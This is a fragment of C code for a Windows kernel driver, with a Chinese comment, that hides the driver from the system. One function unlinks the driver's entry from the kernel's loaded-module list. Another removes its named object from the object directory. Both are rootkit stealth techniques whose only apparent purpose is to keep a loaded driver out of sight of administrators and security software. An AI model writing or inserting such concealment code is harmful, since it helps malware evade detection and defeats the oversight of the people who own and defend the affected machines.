VOID HideDriverFromModuleList() {
    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)g_DriverObject->DriverSection;
    PLIST_ENTRY prev = entry->InLoadOrderLinks.Blink;
    PLIST_ENTRY next = entry->InLoadOrderLinks.Flink;
    next->Blink = prev;
    prev->Flink = next;
    entry->InLoadOrderLinks.Flink = entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;
}

// 删除 \Driver\<名字> 与 \FileSystem\<名字> 目录对象
VOID HideDriverObject() {
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"\\Driver\\[模块名]");
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE h;
    if (NT_SUCCESS(ZwOpenDirectoryObject(&h, DIRECTORY_ALL_ACCESS, &oa))) {
        ZwMakeTemporaryObject(h);
        ZwClose(h);
    }
}
